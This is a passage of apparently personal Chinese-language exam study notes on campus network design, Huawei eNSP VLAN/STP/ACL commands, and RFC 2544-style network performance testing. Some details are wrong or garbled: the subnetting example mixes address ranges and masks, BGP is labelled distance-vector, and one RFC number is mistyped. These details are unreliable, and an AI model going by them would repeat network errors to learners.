<p>网络结构图应当反映子网间路由选择需求，以及上下级，友邻关系之间网络的互联互通实现方式</p>
<ul>
<li>网络管理需求</li>
</ul>
<p>如果网络规模较大，有许多路由器，交换机，则需要配备相应的管理设备及软件，以便对各路由器，交换机的运行状态进行实时监测</p>
<ul>
<li>安全防护需求</li>
</ul>
<p>如果需要实现用户单位网络的内部防护，则需要对进出本单位的报文进行过滤，需要在单位网络设置统一的进出口并部署防火墙或入侵监测系统</p>
<ul>
<li>成本需求</li>
</ul>
<p>网络拓扑图也间接地反映用户单位网络建设的主要硬件成本</p>
<h2 id="层次性拓扑结构"><a href="#层次性拓扑结构" class="headerlink" title="层次性拓扑结构"></a>层次性拓扑结构</h2><ul>
<li>核心层提供两个场点之间的优化传输路径</li>
<li>汇聚层将网络服务连接到接入层,并且实现安全，流量负载和选路的策略</li>
<li>在广域网设计中，接入层由园区边界上的路由器组成。在园区网中，接入层为端用户访问提供交换机或集线器</li>
</ul>
<p>P197 小型校园网配置根据表格配置RIP或OSPF协议</p>
<h3 id="平面模型"><a href="#平面模型" class="headerlink" title="平面模型"></a>平面模型</h3><ul>
<li>平面局域网拓扑结构</li>
<li>平面广域网拓扑结构</li>
<li>网状拓扑结构</li>
</ul>
<h3 id="层次模型-1"><a href="#层次模型-1" class="headerlink" title="层次模型"></a>层次模型</h3><ul>
<li>核心层</li>
<li>汇聚层</li>
<li>接入层</li>
</ul>
<aside>
👹 因特网当前地址分配策略被称为**无差别域间路由选择CIDR**

</aside>

<h2 id="IP规划"><a href="#IP规划" class="headerlink" title="IP规划"></a>IP规划</h2><p>划分子网!!必考计算 用书上的格式</p>
<p>第七章ppt上的例子</p>
<p>选路算法</p>
<p>选路协议</p>
<p>IGRP </p>
<p>对比</p>
<p>A类地址有约700W地址</p>
<p>B类地址</p>
<p>C类地址</p>
<p>NAT </p>
<p>使用原因</p>
<p>采用NAT方式后，企业可以自定义一套内部IP地址，对外发起通信时，统一由NAT设备转为公网IP</p>
<p>规划校园网IP地址！！ IP计算 地址规划 ！！！划分8*256个IP</p>
<p>参考 P241</p>
<p>因需要用6个子网，考虑到要去除两个保留的特殊子网地址（即地址全0和全1的子网），至少需要8个子网，即n=3 因为2^3=8 而每个子网可容纳的主机数量去除主机号为全0和全1的主机 即2^5-2-30&gt;25能够满足需求<br>                        新子网划分172.168.143.27</p>
<p>掩码部分    255.255.255.111 00000                     子网IP地址范围 </p>
<p>子网0        192，168，143，000XXXXX     // 192.168.143.0~192.168.143.31 全0需去除</p>
<p>…</p>
<p>第八章选择题！！ </p>
<h2 id="eNSP语句"><a href="#eNSP语句" class="headerlink" title="eNSP语句"></a>eNSP语句</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><ol>
<li>创建vlan vlan int</li>
<li>批量创建vlan vlan batch int1 int2</li>
<li>进入端口 interface GigabitEthernet 0/0/1</li>
<li>配置端口链路类型 port link-type access/trunk/hybrid</li>
<li>配置端口允许通过的vlan port default vlan int</li>
<li>配置端口允许通过的vlan trunk allow-pass vlan int</li>
<li>进入vlan X的三层接口 interface vlanif X</li>
<li>在三层接口下设置地址 ip address ip地址 子网掩码位数/子网掩码</li>
</ol>
<h3 id="生成树"><a href="#生成树" class="headerlink" title="生成树"></a>生成树</h3><ol>
<li>指定生成树协议类型 stp mode { stp | mstp | rstp }</li>
<li>配置交换机优先级 stp priority</li>
<li>指定交换机成为根桥 stp root primary</li>
<li>指定交换机成为次根桥 stp root secondary</li>
<li>启用生成树 stp enable</li>
</ol>
<h3 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h3><ol>
<li>使用编号创建一个基本ACL，并进入ACL视图 acl num</li>
<li>创建一个基本规则（rule）rule 5 {permit/deny} source src-address wildcard</li>
<li>创建一个高级规则（rule）rule 5 {permit/deny} source src-address wildcard destination destinantion-address wildcard</li>
<li>使用名称创建基本ACL acl name xxx basic</li>
</ol>
]]></content>
      <categories>
        <category>NetWork</category>
      </categories>
      <tags>
        <tag>Learning</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>网络测试与评价</title>
    <url>/2022/07/02/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E4%B8%8E%E8%AF%84%E4%BB%B7/</url>
    <content><![CDATA[<h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h1><aside>
⏰ **BMWG**(基准方法学工作组 Benchmarking Methodology Working Group)

</aside>

<h2 id="网络测试的基本概念"><a href="#网络测试的基本概念" class="headerlink" title="网络测试的基本概念"></a>网络测试的基本概念</h2><pre><code>   网络测试是指以科学的方法，通过测量手段/工具，取得网络产品或正在运行网络的性能参数和服务质量参数，这些参数包括可用性、差错率、吞吐量、时延、丢包率、连接建立时间、故障检测和改正时间等。
</code></pre>
<span id="more"></span>
<h2 id="典型的网络测试方法"><a href="#典型的网络测试方法" class="headerlink" title="典型的网络测试方法"></a>典型的网络测试方法</h2><ol>
<li>使用测试设备单独对网络设备进行测试 即单品测试，这种测试多用于再网络设备的研发阶段对设备的质量进行保障</li>
<li>将网络设备放在具体网络环境中进行测试，以评估该设备的互通性及互操作性，这种在真实环境下的测试常见于运营商、企业网中</li>
</ol>
<h2 id="网络测试的时间"><a href="#网络测试的时间" class="headerlink" title="网络测试的时间"></a>网络测试的时间</h2><aside>
⏰ 网络测试贯穿网络产品生命周期与网络建设生命周期

</aside>

<ul>
<li>网络产品的生命周期通常包括产品立项，硬件开发，协议栈开发，系统联调，互通性验证，性能评估，入网测试，产品售后维护等阶段</li>
<li>网络建设生命周期一般要经历规划、设计、部署、运行和升级5阶段。</li>
</ul>
<h3 id="RFC文档参考"><a href="#RFC文档参考" class="headerlink" title="RFC文档参考"></a>RFC文档参考</h3><p><a href="https://www.notion.so/RFC_PAGE-5a8aa5687fa74fd3b83413a0fd8e282a">RFC_PAGE</a> </p>
<table>
<thead>
<tr>
<th>应用层</th>
<th>RFC 3511</th>
<th>RFC 2544</th>
</tr>
</thead>
<tbody><tr>
<td>表示层</td>
<td>RFC 3511</td>
<td>RFC 2544</td>
</tr>
<tr>
<td>会话层</td>
<td>RFC 3511</td>
<td>RFC 2544</td>
</tr>
<tr>
<td>传输层</td>
<td>RFC 3511</td>
<td>RFC 2544</td>
</tr>
<tr>
<td>网络层</td>
<td>RFC 3222</td>
<td>RFC 2544</td>
</tr>
<tr>
<td>数据链路层</td>
<td>RFC 2889</td>
<td>RFC 2544</td>
</tr>
<tr>
<td>物理层</td>
<td>NULL</td>
<td>NULL</td>
</tr>
</tbody></table>
<h2 id="网络测试分类📖"><a href="#网络测试分类📖" class="headerlink" title="网络测试分类📖"></a>网络测试分类📖</h2><p>一致性测试</p>
<p>测试设备相关协议的实现是否遵循协议规范</p>
<p>功能测试</p>
<p>验证产品标称支持的功能是否能正常实现</p>
<p>性能测试</p>
<p>通常被看成是一种“压力测试”，目的是观察设备在业务压力下的表现</p>
<ul>
<li>性能测验测试</li>
<li>负载测试</li>
<li>压力测试</li>
</ul>
<p>被动测试</p>
<p>在真实的运行状态下观察协议运行的过程，一般在两种状态下观察</p>
<ol>
<li>在无外界干扰的情况下按照协议的正常流程去观察</li>
<li>人为制造一些如错误的路由协议报文，关闭了路由协议的端口等异常事件并观察协议运行的状态</li>
</ol>
<h2 id="性能测试一般规则🤨"><a href="#性能测试一般规则🤨" class="headerlink" title="性能测试一般规则🤨"></a>性能测试一般规则🤨</h2><ul>
<li>一般需要具体分析<ol>
<li>为什么要对它进行测试，明确测试目的</li>
<li>明确测试对象</li>
<li>由谁来执行测试，测试执行者应具备怎样的技术条件</li>
<li>完成测试任务大约需要时间</li>
<li>达到测试目的所付出的成本是多少，软硬件如何配置</li>
<li>如何制定详细的测试方法，是否有成文的测试方法学作为参考</li>
</ol>
</li>
<li>制定测试方法前需要具备的前提条件<ol>
<li>理解技术 : 如何运作 | 相关参数 | 正常情况</li>
<li>理解被测试的设备或系统 : 支持协议 | 特点 | 运行期望</li>
<li>理解测试设备 : 配置方法 | 如何正确测试</li>
</ol>
</li>
</ul>
<h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><p>需要经过测试床搭建、测试环境配置、执行测试、测试结果记录及分析等阶段</p>
<ol>
<li> 配置DUT/SUT/NUT设备</li>
<li>连接测试仪表</li>
<li>运行控制软件并使之能控制仪表</li>
<li>配置相应端口的基本参数</li>
<li>使用软件模拟网络并进行相应配置</li>
<li>配置常规的测试参数，在软件界面配置相关参数，比如流的设置、包的大小</li>
<li>运行测试</li>
<li>保存测试结果</li>
</ol>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul>
<li>测试帧长中 ：最小帧长为64 最大帧长为1518</li>
<li>每个实验测试持续时间最少达到60秒</li>
</ul>
<h1 id="第一章-习题"><a href="#第一章-习题" class="headerlink" title="第一章 习题"></a>第一章 习题</h1><ul>
<li>选择题<ul>
<li>路由器OSPF Hello报文相关字段验证不属于性能测试</li>
<li>BMWG进行网络测试方法学方面的研究</li>
<li>在网络产品的生命周期中，应该按照一致性测试，功能测试，性能测试的顺序执行测试</li>
<li>对以太网Pause帧格式进行验证属于以太网一致性测试</li>
<li>RFC3511适用于防火墙的测试</li>
<li>RFC2544<strong>不</strong>只适用于网络二三层设备的测试</li>
</ul>
</li>
</ul>
<ol>
<li>对一台具有三层功能的防火墙进行测试，可以参考RFC 3222 与 RFC 2544</li>
<li>RFC2511 中的测试项目<ul>
<li>吞吐量测试</li>
<li>等待时间测试</li>
<li>帧损失率测试</li>
<li>背靠背帧测试</li>
<li>系统恢复测试</li>
<li>重置测试</li>
</ul>
</li>
<li>对一台2E+2POS口的路由器进行性能测试：</li>
</ol>
<p>根据RFC2544标准对吞吐量进行测试</p>
<p>目的: 测试出目标路由器的吞吐量参数</p>
<p>步骤: </p>
<ol>
<li> 配置路由器与测试器</li>
<li>连接测试器</li>
<li>运行控制软件并使之能控制路由器</li>
<li>配置相应端口的基本参数</li>
<li>使用软件模拟网络并进行吞吐量测试设置</li>
<li>运行测试</li>
<li>保存测试结果</li>
</ol>
<h1 id="第二章-第二层以太网测试"><a href="#第二章-第二层以太网测试" class="headerlink" title="第二章 第二层以太网测试"></a>第二章 第二层以太网测试</h1><h3 id="交换机体系结构"><a href="#交换机体系结构" class="headerlink" title="交换机体系结构"></a>交换机体系结构</h3><ul>
<li>共享总线型</li>
<li>共享存储器</li>
<li>纵横式矩阵交换结构</li>
</ul>
<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>性能试验测试通常可以被看成是一种“压力测试”，目的是观察设备在业务压力下的表现。</p>
<p>没有负载或低负载、基本功能(比如验证网络设备的基本转发及可用性测试等)的验证。</p>
<h2 id="负载测试"><a href="#负载测试" class="headerlink" title="负载测试"></a>负载测试</h2><p>确定在各种工作负载下系统的性能，目标是测试当负载逐渐增加时，系统各项性能指标的变化情况。</p>
<h2 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h2><p>是通过确定一个系统的瓶颈或者不能接收的性能点，来获得系统能提供的最大服务级别的测试。</p>
<h2 id="数据传输层相关指标"><a href="#数据传输层相关指标" class="headerlink" title="数据传输层相关指标"></a>数据传输层相关指标</h2><aside>
🎁 决定交换性能

</aside>

<ul>
<li>负载</li>
</ul>
<p>信道或设备在单位时间内所承受的通信流量称为负载(Load)。</p>
<ul>
<li>转发速率</li>
</ul>
<p>转发速率(Forwarding Rate)是用于描述交换设备帧转发能力的指标</p>
<ul>
<li>丢帧率</li>
</ul>
<p>传输过程中丢失的数据帧占应转发帧的比例称为丢帧率(Frame Loss Ratio)</p>
<ul>
<li>吞吐量</li>
</ul>
<p>在没有出现丢帧的条件下，能够传输给交换机让其转发到指定输出端口的每秒最大帧数</p>
<ul>
<li>突发</li>
</ul>
<p>一组以合法最小帧间隔传输的以太网帧称为突发(Burst)，在网络中，突发通常由节点的突发数据流量引发。一次突发传输中所包含的帧数被称为突发量(Burst Size)</p>
<h2 id="传输控制层面相关指标"><a href="#传输控制层面相关指标" class="headerlink" title="传输控制层面相关指标"></a>传输控制层面相关指标</h2><aside>
🎁 决定以太网数据传输性能

</aside>

<ul>
<li>拥塞控制</li>
</ul>
<p>也称为流量控制，指在以太网上控制源端发送数据的数量及速度使其不超过接收端所能承受的能力，以避免产生帧的丢失。</p>
<ul>
<li>地址处理</li>
</ul>
<p>交换机基于第二次MAC地址完成帧的过滤和转发</p>
<ul>
<li>地址缓存容量</li>
</ul>
<p>设备或端口模块所能拥有的最大MAC数，也就是地址交换表的最大容量</p>
<ul>
<li>地址学习速率</li>
</ul>
<p>在没有广播和丢帧的情况下，交换机学习新地址的最大速度</p>
<ul>
<li>错误帧过滤</li>
</ul>
<p>错误帧(Error Frame)：指所有过长(&gt;1518B)，过短(&lt;64B)，错位或含有错误校验序列的帧</p>
<ul>
<li>广播</li>
</ul>
<p>当交换机的输入端口收到一个帧，并且在地址表中找不到与帧的目的的MAC地址所对应的目的端口时，就会采用向所有端口泛洪广播的方法来转发该帧。</p>
<ul>
<li>广播速率：一台交换设备在某个指定的广播负载下，1秒内向它所在的广播域的所有端口发送的广播帧的数量</li>
<li>广播延迟：交换机将广播帧转发到位于同一个广播域中的每一个端口所需的时间</li>
<li>流量隔离  用于衡量交换机VLAN流量隔离功能的指标</li>
</ul>
<h2 id="产生拥塞控制的主要原因"><a href="#产生拥塞控制的主要原因" class="headerlink" title="产生拥塞控制的主要原因"></a>产生拥塞控制的主要原因</h2><ul>
<li>过载</li>
<li>线端堵塞</li>
</ul>
<h2 id="背压-Backpressure"><a href="#背压-Backpressure" class="headerlink" title="背压(Backpressure )"></a>背压(Backpressure )</h2><p>当外出或输出端口出现拥塞现象时，被交换机用来通知发送端降低帧发送速度，以阻止外部数据源继续向拥塞端口传输帧的那些方法。</p>
<h2 id="前压-Forward-pressure"><a href="#前压-Forward-pressure" class="headerlink" title="前压(Forward pressure )"></a>前压(Forward pressure )</h2><p>当上游设备以小于最小帧间隙的间隔或以超过线速的速率向下游交换机发送流量时，往往会导致下游交换机出现接收缓冲(buffer)溢出甚至阻塞。某些交换机可通过减缓输出队伍的饱和程度、禁止上游设备发送帧等强制性机制来消除或减少上述丢帧现象。具有上述功能的交换机被认为具有前压机制。</p>
<h2 id="网状流量"><a href="#网状流量" class="headerlink" title="网状流量"></a>网状流量</h2><h3 id="非网状流量"><a href="#非网状流量" class="headerlink" title="非网状流量"></a>非网状流量</h3><p>一对一关系</p>
<h3 id="部分网状流量"><a href="#部分网状流量" class="headerlink" title="部分网状流量"></a>部分网状流量</h3><p>一对多，多对一或多对多</p>
<h3 id="全网状流量"><a href="#全网状流量" class="headerlink" title="全网状流量"></a>全网状流量</h3><p>完全多对多，对于一个有n个被测端口的交互机而言，在单向流量时，将会形成$n(n-1)/2$的端口对，而在双向流量时，相当于有$n(n-1)$个端口对</p>
<h2 id="测试设置中的二层地址学习"><a href="#测试设置中的二层地址学习" class="headerlink" title="测试设置中的二层地址学习"></a>测试设置中的二层地址学习</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>在测试开始之前让被测试交换机学习测试中将要用到的MAC地址。</p>
<h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>先学习、再验证、后测试</p>
<h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ol>
<li>发送地址学习帧的速率不可太大(建议：&lt;=50帧每秒)，以免因DUT地址学习速率上的限制而导致地址学习失败。</li>
<li>调整被测试交换机的地址老化时间，使得其足够长( 建议：大于测试学习时间、测试持续时间、配置测试设备时间的和) ，确保在测试结束前所学到的地址都不被老化。</li>
</ol>
<h2 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h2><ul>
<li>规定最小帧长是为了避免冲突</li>
<li>时延测试必须在吞吐之后</li>
</ul>
<h1 id="第二章-习题"><a href="#第二章-习题" class="headerlink" title="第二章 习题"></a>第二章 习题</h1><ul>
<li>选择题<ul>
<li>规定最小帧长<del>是为了让各节点公平访问共享介质</del>  是为了避免产生冲突,防止线路上的信号碰撞</li>
<li>确定一个设备的MAC地址学习速率和地址表容量属于以太网性能测试</li>
<li>检查一个设备是否遵循以太网的有关协议标准属于一致性测试<br>确定一个设备是否支持IEEE802.3x流量控制属于功能测试</li>
<li>当要对两个设备之间的上行链路进行测试时，应该选用非网状测试拓扑</li>
<li>在设备MAC地址处理能力测试中，需要在DUT上检查所能够配置的静态地址表项</li>
<li>根据RFC2544，在以太网测试种，对于每种测试条件，必须在至少5种不同的帧长下进行</li>
<li>对第二层设备进行性能测试时，可查RFC1252，RFC2544，RFC2285，RFC2889</li>
<li>任何情况下都可能出现提交负载与期望负载不相同</li>
</ul>
</li>
</ul>
<p>1.关于吞吐量与帧长的关系曲线图说明了：帧长到一定程度后，帧越长，同一段时间内帧数量就越少，设备吞吐量就越大</p>
<p>2.如图 循环轮转发送数据帧，尽可能使每个接口都受到测试，使测试结果可靠</p>
<table>
<thead>
<tr>
<th>端口#1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>2…</th>
</tr>
</thead>
<tbody><tr>
<td>端口#2</td>
<td>3</td>
<td>4</td>
<td>5</td>
<td>6</td>
<td>1</td>
<td>3…</td>
</tr>
<tr>
<td>端口#3</td>
<td>4</td>
<td>5</td>
<td>6</td>
<td>1</td>
<td>2</td>
<td>4…</td>
</tr>
<tr>
<td>端口#4</td>
<td>5</td>
<td>6</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>5…</td>
</tr>
<tr>
<td>端口#5</td>
<td>6</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
<td>6…</td>
</tr>
<tr>
<td>端口#6</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
<td>5</td>
<td>1…</td>
</tr>
</tbody></table>
<p>3.给出了2个端口组成的测试拓扑，能否有效实现？至少四个，2个端口不足以测试出拥塞控制</p>
<p>4.给出了8个由端口组成的测试块，是否必须？4个测试源端口，4个测试目的端口，是必须的</p>
<p>5.有人设计了一种时间触发器方法，分析可行性：端口UE多，需要复制转发的帧就越多，可能会导致延迟加长，导致测试不准</p>
<p>6.设计可用于VLAN隔离功能测试的拓扑，思路：4个端口，俩端口在同一VLAN 俩不在同一个VLAN 控制变量测试功能</p>
<h1 id="第三章-第三层网络测试"><a href="#第三章-第三层网络测试" class="headerlink" title="第三章 第三层网络测试"></a>第三章 第三层网络测试</h1><h2 id="路由器组成"><a href="#路由器组成" class="headerlink" title="路由器组成"></a>路由器组成</h2><h3 id="路由选择部分"><a href="#路由选择部分" class="headerlink" title="路由选择部分"></a>路由选择部分</h3><p>主要作用是通过路由协议交换网络拓扑结构信息，依照拓扑结构动态更新和维护路由表，其核心构件是路由选择处理机，运行的路由协议可以有不同的类型</p>
<h3 id="分组转发部分"><a href="#分组转发部分" class="headerlink" title="分组转发部分"></a>分组转发部分</h3><p>根据控制层面生成的转发表FIB转发IP分组，由交换结构，输入端口和输出端口构成</p>
<p><strong>交换结构</strong></p>
<p>根据FIB对来自某个输入端口的分组进行处理，并使其从一个合适的输出端口转发，完成输入输出端口间的互连功能</p>
<p><strong>输入端口</strong>🍉</p>
<p>输入端口是物理链路的连接点，也是分组(数据包)的接收点。端口通常由线卡提供，一块线卡一般支持4、8或16个端口，每个输入端口有3个模块，分别对应物理层，数据链路层和网络层。</p>
<p>如果接受的分组是路由器之间的路由交换信息，则将这种分组送交路由器的路由选择处理机。</p>
<p>当一个分组正在查找转发表时，后面又紧跟着从这个输入端口收到的另一个数据包，则后到的分组旧必须在输入队列中排队等待</p>
<p><strong>输出端口</strong></p>
<p>队列和缓冲管理</p>
<h2 id="路由器的体系结构⛷️"><a href="#路由器的体系结构⛷️" class="headerlink" title="路由器的体系结构⛷️"></a>路由器的体系结构⛷️</h2><p><strong>路由器的传输控制层面</strong></p>
<p>运行在通用CPU系统中，多年来一直没有多少变化。在高可用性路由器设计中，大多采用双主控进行主从式备份，以保证传输控制平面的可靠性</p>
<p><strong>路由器的数据转发层面</strong></p>
<p>为适应不同的线路速度和不同的系统容量，采用了不同的实现技术</p>
<h2 id="路由器工作原理"><a href="#路由器工作原理" class="headerlink" title="路由器工作原理"></a>路由器工作原理</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>路由处理和分组转发处理</p>
<h3 id="路由处理"><a href="#路由处理" class="headerlink" title="路由处理"></a>路由处理</h3><p>通过路由协议收集网络拓扑信息并动态形成路由表RIB</p>
<h3 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h3><p>存放到特定网络的所有路由信息</p>
<h3 id="数据转发"><a href="#数据转发" class="headerlink" title="数据转发"></a>数据转发</h3><p>根据转发表FIB转发IP分组，FIB是根据RIB生成的，其表项和RIB项间又直接的对应关系，但FIB和RIB的内容并不一定匹配，格式也不相同，FIB在发送分组时可供路由协议使用，FIB更适合实现快速查找</p>
<h3 id="转发流程"><a href="#转发流程" class="headerlink" title="转发流程"></a>转发流程</h3><p>线路输入→分组头部分析→数据存储→分组头部修改和线路输出</p>
<h2 id="路由器类型"><a href="#路由器类型" class="headerlink" title="路由器类型"></a>路由器类型</h2><h3 id="性能划分"><a href="#性能划分" class="headerlink" title="性能划分"></a>性能划分</h3><p>高中低档路由器</p>
<blockquote>
<p>背板转发大于40Gbps  在25~40Gbps 之间 小于24Gbps的路由器</p>
</blockquote>
<p>线速|非线速路由器</p>
<blockquote>
<p>线速： 完全可以按照传输介质贷款进行分组转发，传输过程基本上没有间断和延时</p>
</blockquote>
<h3 id="结构划分"><a href="#结构划分" class="headerlink" title="结构划分"></a>结构划分</h3><ul>
<li>模块化路由</li>
<li>非模块化路由</li>
</ul>
<h3 id="所处位置划分"><a href="#所处位置划分" class="headerlink" title="所处位置划分"></a>所处位置划分</h3><ul>
<li>边界路由器</li>
<li>中间节点路由器</li>
</ul>
<h3 id="应用划分"><a href="#应用划分" class="headerlink" title="应用划分"></a>应用划分</h3><ul>
<li>通用路由器</li>
<li>专用路由器</li>
</ul>
<h2 id="数据转发层面相关指标"><a href="#数据转发层面相关指标" class="headerlink" title="数据转发层面相关指标"></a>数据转发层面相关指标</h2><p>主要考察包的转发是否准确，有无丢包，转发延迟多大等</p>
<ul>
<li>吞吐量</li>
</ul>
<aside>
📎 又分整机吞吐量和端口吞吐量

</aside>

<p>在没有丢包的情况下，路由设备能够转发的最大速率</p>
<ol>
<li>保证待转发的每个包都能从输入端口准确转发到适当的输出端口</li>
<li>DUT在不丢包的前提下，单位时间内能够转发的最大包数量</li>
</ol>
<ul>
<li>延迟</li>
</ul>
<p>包的第一个比特进入路由器到最后一个比特离开路由器的时间间隔，又叫时延</p>
<ul>
<li>丢包率</li>
</ul>
<p>路由器在稳定负载情况下，由于缺乏资源而不能被网络设备转发的包所占所有应被转发的包的百分比</p>
<ul>
<li>背对背</li>
</ul>
<p>指的是在一段较短的时间内，以合法的最小帧间隙在传输媒介上连续发送固定长度的包不引起丢包时的包数量。</p>
<ul>
<li>时延抖动</li>
</ul>
<p>时延的变化</p>
<ul>
<li>背板能力</li>
</ul>
<p>背板指路由设备输入和输出间的物理通路，无法直接测试，但是可以体现在吞吐量上，通常大于依赖吞吐量和测试包长所计算的值</p>
<ul>
<li>系统恢复</li>
</ul>
<p>路由设备从超载情况下恢复到正常转发状态的行为特征，主要表现为系统恢复速度的快慢</p>
<ul>
<li>系统重启</li>
</ul>
<p>系统重启时，不能正常工作，这段不可用时间的长短对评估性能优劣相当重要</p>
<h2 id="数据控制层面相关的指标"><a href="#数据控制层面相关的指标" class="headerlink" title="数据控制层面相关的指标"></a>数据控制层面相关的指标</h2><ul>
<li>路由振荡</li>
<li>路由表容量</li>
<li>路由收敛时间</li>
</ul>
<h2 id="帧长度与最大理论速率"><a href="#帧长度与最大理论速率" class="headerlink" title="帧长度与最大理论速率"></a>帧长度与最大理论速率</h2><table>
<thead>
<tr>
<th>帧长度/B</th>
<th>以太网/fps</th>
<th>16Mbps令牌环/fps</th>
<th>FDDI/fps</th>
</tr>
</thead>
<tbody><tr>
<td>64</td>
<td>14880</td>
<td>24691</td>
<td>152439</td>
</tr>
</tbody></table>
<h1 id="第三章-习题"><a href="#第三章-习题" class="headerlink" title="第三章 习题"></a>第三章 习题</h1><ul>
<li>选择题<ul>
<li>延迟测试应该在吞吐量测试之后进行</li>
<li>RFC2544中没有涉及地址学习速率</li>
<li>RFC1242中没有描述集线器</li>
<li>进行第三层设备性能测试时可以参考RFC1242，RFC2544，RFC3222 （以上全部）</li>
<li><del>在每一种测试条件下必须至少采用5种测试帧长</del></li>
</ul>
</li>
</ul>
<ol>
<li>IP包头最大长度60字节，根据RFC791标准 ，最低20字节，最大长度60字节</li>
<li>数据传输层面衡量路由器性能的主要技术指标：吞吐量，延迟，丢包率，背对背，时延抖动，背板能力，系统恢复，系统重启</li>
<li>吞吐量是在没有丢包的情况下，路由设备能够转发的最大速率。<br>在每一轮吞吐量测试中，以某个特定的速度发送测试帧，并对DUT转发的帧数进行统计。如果接收到的帧数比发送的帧数少，则下一轮测试的帧速率应降低，否则应提高。最常用的吞吐量搜索算法是二分搜索法，只需要设置初始帧速率(或负荷百分比)、最小速率和最大速率即可。若丢帧，下一轮测试速率为当前速率与最小速率的中值，否则则为当前速率与最大速率的中值。当前测试与前一次测试的帧速率之间小与或等于设置的精度时，测试结束。<br>吞吐量测试应该每次持续60s以上</li>
<li>延迟指第一个Byte进入DUT到最后一个Byte离开DUT的时间间隔<br>如果超过吞吐量就会产生丢包，失去测试意义</li>
<li>丢包率测试目的，与吞吐量的关系：<br>反应网络超负荷运作下的性能<blockquote>
<p>丢包率主要反映网络设备在超负荷运转的情况下的处理策略，设备应该采用合适的丢弃策略，尽量确保关键帧和重要帧的顺利传输</p>
</blockquote>
 帧<strong>分类：</strong>数据帧，学习帧，路由更新帧，管理帧等 可能导致大量数据帧无法交换而引起更大的丢包率的某个关键的路由信息帧和那些具有QoS保证的应用数据帧都不能被丢弃，需要及时转发</li>
<li>背对背：指的是在一段较短的时间内，以合法的最小帧间隙在传输媒介上连续发送固定长度的包不引起丢包时的包数量。需要确定DUT在不丢包的情况下能够处理的最大包数目，以考察路由器接口对于突发数据的缓存能力。</li>
</ol>
<h1 id="第四章-IP路由测试"><a href="#第四章-IP路由测试" class="headerlink" title="第四章 IP路由测试"></a>第四章 IP路由测试</h1><aside>
📎 路由器最基本的功能是路由与交换

</aside>

<aside>
🚧 路由器采用何种方法获得路由信息会直接影响路由性能

</aside>

<h2 id="路由表的生成和维护"><a href="#路由表的生成和维护" class="headerlink" title="路由表的生成和维护"></a>路由表的生成和维护</h2><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p>适用于拓扑结构比较简单的环境</p>
<p>默认路由可以减少路由表规模并且降低路由表的维护开销</p>
<h3 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h3><ul>
<li>RIP(距离矢量路由协议)</li>
<li>OSPF(链路状态路由协议)</li>
<li>IS-IS(链路状态路由协议)</li>
<li>BGP(距离矢量路由协议)</li>
</ul>
<h2 id="OSPF"><a href="#OSPF" class="headerlink" title="OSPF"></a>OSPF</h2><p>每个OSPF路由器以自己为根，采用SPF计算得到每个目的网络的最短路径，最终得到一棵SPT，然后使用通向每个网络的最佳路径填充路由表</p>
<aside>
🥶 OSPF可借助分区域网络设计原则来提高路由的可靠性和可扩展性

</aside>

<h2 id="路由收敛-Convergence"><a href="#路由收敛-Convergence" class="headerlink" title="路由收敛(Convergence)"></a>路由收敛(Convergence)</h2><p>路由收敛是指同一个网络中所有路由器对网络拓扑的认识达到一致的过程。也被理解为路由变化通知到全网所用时间。收敛是评估路由协议的一个关键指标。路由协议的收敛速度越快，其运行性能就越好。</p>
<h2 id="路由震荡-Flapping"><a href="#路由震荡-Flapping" class="headerlink" title="路由震荡(Flapping)"></a>路由震荡(Flapping)</h2><p>又叫路由波动是指由于种种原因导致到某个目的网络的路由在短期内反复撤销和重现。路由震荡通常以每秒更新路由的数量来衡量，每秒更新路由的数量越大，说明路由震荡越严重。路由震荡是路由不稳定性的主要表现，对路由器转发能力有很大的影响</p>
<h2 id="路由震荡测试基本设计思路"><a href="#路由震荡测试基本设计思路" class="headerlink" title="路由震荡测试基本设计思路"></a>路由震荡测试基本设计思路</h2><p>使用测试仪表的一个端口向DUT下发多个特定IP网络前缀的路由。另一端口用来发送到这些特定IP网络前缀的测试流量，并且在路由震荡测试的整个过程中，流量发送端口始终保持流量的发送状态不变。当路由已稳定时，撤消下发的多个特定IP网络前缀中的部分路由。等路由再次稳定时，又重新下发刚撤消的路由。如此反复下发、撤消，人为制造出路由震荡的环境。然后在测试仪表上观测控制层面的转发，并同时观测数据转发层面测试流的转发速率，得到测试结果</p>
<h2 id="路由震荡测试方法基本原理"><a href="#路由震荡测试方法基本原理" class="headerlink" title="路由震荡测试方法基本原理"></a>路由震荡测试方法基本原理</h2><p>在网络中，某些事件可能导致全网范围内的路由重新计算，直接影响到路由的稳定性，从而影响IP报文的转发。路由震荡是网络中路由不稳定的主要表现形式。</p>
<aside>
⏰ 路由收敛和路由震荡测试互不相关

</aside>

<h1 id="第四章-习题"><a href="#第四章-习题" class="headerlink" title="第四章 习题"></a>第四章 习题</h1><ul>
<li>选择题<ul>
<li>Spirent TestCenter不支持EIBGP路由协议</li>
<li>控制台读数法，控制层面学习法，数据转发层面和控制层面结合法测出的路由器容量都是FIB表的容量</li>
<li>路由真的测试和路由收敛测试谁先测试均可以</li>
